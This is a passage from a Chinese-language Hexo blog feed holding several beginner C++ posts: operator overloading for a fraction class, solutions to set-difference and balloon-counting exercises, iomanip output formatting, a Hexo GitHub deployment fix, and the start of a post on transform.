&amp;x);</span><br><span class="line">    <span class="keyword">friend</span>  ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;out, CFraction x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span>  CFraction  <span class="keyword">operator</span>+(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2);    <span class="comment">//两个分数相加，结果要化简</span></span><br><span class="line">    <span class="keyword">friend</span>  CFraction  <span class="keyword">operator</span>-(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2);    <span class="comment">//两个分数相减，结果要化简</span></span><br><span class="line">    <span class="keyword">friend</span>  CFraction  <span class="keyword">operator</span>*(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2);    <span class="comment">//两个分数相乘，结果要化简</span></span><br><span class="line">    <span class="keyword">friend</span>  CFraction  <span class="keyword">operator</span>/(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2);    <span class="comment">//两个分数相除，结果要化简</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CFraction::simplify</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> nume_ = <span class="built_in">abs</span>(nume), deno_ = <span class="built_in">abs</span>(deno); <span class="comment">// 保存原分数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nume &lt; <span class="number">0</span> &amp;&amp; deno &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nume *= <span class="number">-1</span>;</span><br><span class="line">        deno *= <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nume &gt; <span class="number">0</span> &amp;&amp; deno &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nume *= <span class="number">-1</span>;</span><br><span class="line">        deno *= <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (deno_ % nume_ != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> temp = deno_;</span><br><span class="line">        deno_ = nume_;</span><br><span class="line">        nume_ = temp % nume_;</span><br><span class="line">    &#125;</span><br><span class="line">    nume /= nume_;</span><br><span class="line">    deno /= nume_;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 也可以这么写</span></span><br><span class="line"><span class="comment">    while (nume_ != deno_)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (nume_ &gt; deno_)</span></span><br><span class="line"><span class="comment">            nume_ -= deno_;</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            deno_ -= nume_;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    nume /= nume_;</span></span><br><span class="line"><span class="comment">    deno /= nume_;*/</span></span><br><span class="line">&#125;</span><br><span class="line">istream &amp;<span class="keyword">operator</span>&gt;&gt;(istream &amp;in, CFraction &amp;x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp;</span><br><span class="line">    in &gt;&gt; x.nume &gt;&gt; temp &gt;&gt; x.deno;</span><br><span class="line">    <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;out, CFraction x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (x.deno != <span class="number">1</span>)</span><br><span class="line">        out &lt;&lt; x.nume &lt;&lt; <span class="string">&#x27;/&#x27;</span> &lt;&lt; x.deno;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        out &lt;&lt; x.nume;</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line">CFraction <span class="keyword">operator</span>+(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">CFraction <span class="title">temp</span><span class="params">(c1.nume * c2.deno + c2.nume * c1.deno, c1.deno * c2.deno)</span></span>;</span><br><span class="line">    temp.<span class="built_in">simplify</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">CFraction <span class="keyword">operator</span>-(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">CFraction <span class="title">temp</span><span class="params">(c1.nume * c2.deno - c2.nume * c1.deno, c1.deno * c2.deno)</span></span>;</span><br><span class="line">    temp.<span class="built_in">simplify</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">CFraction <span class="keyword">operator</span>*(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">CFraction <span class="title">temp</span><span class="params">(c1.nume * c2.nume, c1.deno * c2.deno)</span></span>;</span><br><span class="line">    temp.<span class="built_in">simplify</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">CFraction <span class="keyword">operator</span>/(<span class="type">const</span>  CFraction &amp;c1, <span class="type">const</span>  CFraction &amp;c2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">CFraction <span class="title">temp</span><span class="params">(c1.nume * c2.deno, c1.deno * c2.nume)</span></span>;</span><br><span class="line">    temp.<span class="built_in">simplify</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CFraction  x, y, s;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Input  x:  &quot;</span>;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Input  y:  &quot;</span>;</span><br><span class="line">    cin &gt;&gt; y;</span><br><span class="line">    s = x + y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;x+y=&quot;</span> &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    s = x - y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;x-y=&quot;</span> &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    s = x * y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;x*y=&quot;</span> &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    s = x / y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;x/y=&quot;</span> &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维动态数组易错点</title>
      <link href="/post/eab4f40b.html"/>
      <url>/post/eab4f40b.html</url>
      
        <content type="html"><![CDATA[<h4 id="7-5-集合A-B"><a href="#7-5-集合A-B" class="headerlink" title="7-5.集合A-B"></a>7-5.集合A-B</h4><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>求两个集合的差集。注意，同一个集合中不能有两个相同的元素。请用STL模板求解。</p><p><strong>输入格式:</strong></p><p>首先输入一个正整数T，表示测试数据的组数，然后是T组测试数据。每组测试数据输入1行，每行数据的开始是2个整数n（0 &lt; n ≤ 100）和m（0 &lt; m ≤ 100），分别表示集合A和集合B的元素个数，然后紧跟着n+m个元素，前面n个元素属于集合A，其余的属于集合B。每两个元素之间以一个空格分隔。</p><p><strong>输出格式:</strong></p><p>针对每组测试数据输出一行数据，表示集合A-B的结果，如果结果为空集合，则输出“NULL”（引号不必输出），否则从小到大输出结果，每两个元素之间以一个空格分隔。</p><p><strong>输入样例:</strong></p><p>2</p><p>3 3 1 3 2 1 4 7</p><p>3 7 2 5 8 2 3 4 5 6 7 8</p><p><strong>输出样例:</strong></p><p>2 3</p><p>NULL</p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p><strong>反思：</strong></p><p>题目很简单，但是我调试了好久，最主要的错误是对于容器嵌套容器总是直接对内嵌容器执行push_back()，乍一看好像没有问题，但是却忽略了<strong>内存分配问题</strong>！</p><p>我们定义外层容器时会直接给外层容器名分配内存空间，但是对于内嵌容器而言并未分配内存空间，因此我们是不可以直接对内嵌容器进行操作的！</p><p><strong>解决：</strong></p><p>定义一个内嵌容器类型的temp变量，temp是被分配了内存空间的，所以可以直接使用temp来执行需要的push_back()之类的操作， 执行完一次循环使用外层容器执行一次push_back(temp)<strong>并对temp执行clear()</strong></p><p>例如：下列代码第18行，我最开始写的是<code>num[i].push_back(a)</code>，却直接导致程序崩溃，问过openai才明白是内存分配的问题，内嵌容器此时尚未分配内存，直接插入数据是不被允许的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> T, temp, flag = <span class="number">0</span>, a, b;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; num;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp_v;</span><br><span class="line">cin &gt;&gt; T;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; T; ++i)</span><br><span class="line">&#123;</span><br><span class="line">temp_v.<span class="built_in">clear</span>();</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">temp_v.<span class="built_in">push_back</span>(a);</span><br><span class="line">temp_v.<span class="built_in">push_back</span>(b);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; a; ++j)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp;</span><br><span class="line">temp_v.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; b; ++j)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp;</span><br><span class="line">temp_v.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line">num.<span class="built_in">push_back</span>(temp_v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; T; ++i)</span><br><span class="line">&#123;</span><br><span class="line">temp_v.<span class="built_in">clear</span>();</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">b = <span class="number">2</span> + num[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; num[i][<span class="number">0</span>]; ++j)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; num[i][<span class="number">1</span>]; ++k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[i][a + j] == num[i][b + k])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">count</span>(temp_v.<span class="built_in">begin</span>(), temp_v.<span class="built_in">end</span>(), num[i][a + j]))</span><br><span class="line">&#123;</span><br><span class="line">temp_v.<span class="built_in">push_back</span>(num[i][a + j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">res.<span class="built_in">push_back</span>(temp_v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sort</span>(i.<span class="built_in">begin</span>(), i.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">if</span> (i.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">copy</span>(i.<span class="built_in">begin</span>(), i.<span class="built_in">end</span>(), <span class="built_in">ostream_iterator</span>&lt;<span class="type">int</span>&gt;(cout, <span class="string">&quot; &quot;</span>));</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NULL&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 常见报错 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客部署到github失败</title>
      <link href="/post/b74bb192.html"/>
      <url>/post/b74bb192.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前<code>hexo d</code>部署到github page这一步经常都报错，什么<code>unfatal: can&#39;t connect to github</code>什么的，最近修改了一个配置就再也没有遇到过这个问题了^_^</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>打开站点配置文件<code>_config.yml</code>，搜索<code>inject</code>，找到下列配置部分，将repository中原来的地址按下方<code>repository</code>的格式进行修改：</p><p><strong>git@github.com:你的用户名/你的仓库名.git</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:hellodqy/hellodqy.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++设置输出格式</title>
      <link href="/post/a3246567.html"/>
      <url>/post/a3246567.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="头文件：-lt-iomanip-gt-且需要using-namespace-std"><a href="#头文件：-lt-iomanip-gt-且需要using-namespace-std" class="headerlink" title="头文件：&lt;iomanip&gt;且需要using namespace std"></a>头文件：<code>&lt;iomanip&gt;</code>且需要<code>using namespace std</code></h3><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="1-保留n位小数"><a href="#1-保留n位小数" class="headerlink" title="1. 保留n位小数"></a>1. 保留n位小数</h3><p><code>ps</code>：设置小数位数之后会保持有效到下一次设置小数位数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> num = <span class="number">1.03456</span>;</span><br><span class="line"><span class="comment">//第一种写法</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">2</span>) &lt;&lt; num &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种写法</span></span><br><span class="line">cout.<span class="built_in">setf</span>(ios::fixed);</span><br><span class="line">cout &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">2</span>) &lt;&lt; num &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种写法</span></span><br><span class="line">cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">2</span>) &lt;&lt; num &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="2-输出数据占n位，不足用零填充"><a href="#2-输出数据占n位，不足用零填充" class="headerlink" title="2. 输出数据占n位，不足用零填充"></a>2. 输出数据占n位，不足用零填充</h3><p><code>ps</code>：</p><ol><li>设置输出宽度只对后面一个数据起作用，下一个被输出的数据仍然使用默认宽度</li><li>设置填充符之后会保持有效到下一次设置填充符</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; str &lt;&lt; <span class="string">&quot;-&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以这样写</span></span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">4</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; str &lt;&lt; <span class="string">&quot;-&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="3-靠左或靠右输出"><a href="#3-靠左或靠右输出" class="headerlink" title="3. 靠左或靠右输出"></a>3. 靠左或靠右输出</h3><p><code>ps</code>：设置对齐方式之后会保持有效到下一次设置对齐方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str1 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">string str2 = <span class="string">&quot;2&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; left &lt;&lt; str1 &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; str2 &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h2 id="C-默认格式"><a href="#C-默认格式" class="headerlink" title="C++默认格式"></a>C++默认格式</h2><ol><li>默认宽度：0(任何数据宽度均大于0，所以默认情况下任何数据都不需要进行填充)</li><li>默认填充符：空格</li><li>默认对齐：右对齐</li></ol>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>根据气球统计题目</title>
      <link href="/post/3b7355c3.html"/>
      <url>/post/3b7355c3.html</url>
      
        <content type="html"><![CDATA[<h4 id="7-4-题目统计"><a href="#7-4-题目统计" class="headerlink" title="7-4.题目统计"></a>7-4.题目统计</h4><p>在ACM程序设计竞赛赛场，当某个队伍正确解答一道题目后就会在其前面升起1个彩色气球。而且每种颜色的气球只能用在一道题目上，所以不同颜色的气球不能相互替代。已知比赛过程中已送出的气球数量以及每个气球的颜色，请统计已成功解决的不同题目的总数。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>首先输入一个正整数T，表示测试数据的组数，然后是T组测试数据。每组测试先输入一个整数n（1≤n≤100），代表已经送出的气球总数，然后输入n个已送出气球的颜色（由长度不超过20且不包含空格的英文字母组成），数据之间间隔一个空格。注意，统计时，忽略气球颜色的大小写。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对于每组测试，在一行上输出一个整数，表示已成功解决的不同题目的总数。</p><h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">5 RED Red Blue Green REd</span><br><span class="line">2 Pink pINk</span><br><span class="line">1 YeLLoW</span><br><span class="line">6 Red Blue Orange Blue Red ORANGE</span><br></pre></td></tr></table></figure><h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Group</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n;<span class="comment">// 每行的字符串个数</span></span><br><span class="line">vector&lt;string&gt; ballon;<span class="comment">// 存放每行的字符串</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">vector&lt;Group&gt; group;</span><br><span class="line">Group temp;</span><br><span class="line">string temp_str;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">temp.ballon.<span class="built_in">clear</span>();<span class="comment">// 每次开始前需要清除掉temp.ballon里面存放的字符串</span></span><br><span class="line">cin &gt;&gt; temp.n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; temp.n; ++j)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp_str;</span><br><span class="line"><span class="built_in">transform</span>(temp_str.<span class="built_in">begin</span>(), temp_str.<span class="built_in">end</span>(), temp_str.<span class="built_in">begin</span>(), toupper);<span class="comment">// 将字符串转换为大写再存放</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">count</span>(temp.ballon.<span class="built_in">begin</span>(), temp.ballon.<span class="built_in">end</span>(), temp_str))<span class="comment">// 如果该字符串不存在则存入</span></span><br><span class="line">temp.ballon.<span class="built_in">push_back</span>(temp_str);</span><br><span class="line">&#125;</span><br><span class="line">group.<span class="built_in">push_back</span>(temp);<span class="comment">// 存入一行数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; group[i].ballon.<span class="built_in">size</span>() &lt;&lt; endl;<span class="comment">// 已经对相同字符串做了过滤，直接输出ballon的size即为不同字符串的个数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ps：如果对于transform函数不太熟悉，请移步<a href="https://www.dqywy.top/post/7c713ebc.html">c++字符串大小写转换之transform用法</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++字符串大小写转换之transform用法</title>
      <link href="/post/7c713ebc.html"/>
      <url>/post/7c713ebc.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://blog.csdn.net/weixin_43869898/article/details/105505619">C/C++：字符串大小写转换的几种方式</a></p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p><strong>应用</strong>：字符串大小写转换</p><p><strong>参数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">OutputIterator <span class="title">transform</span> <span class="params">( InputIterator first1,  <span class="comment">// 源容器的起始地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">                                InputIterator last1,    <span class="comment">// 源容器的终止地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">                                OutputIterator result,  <span class="comment">// 目标容器的起始地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">                                UnaryOperator op )</span></span>;     <span class="comment">// 函数指针</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：目标容器存储字符串后的下一个位置的迭代器，具体请看下面实例第三步——测试返回值</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">string str = 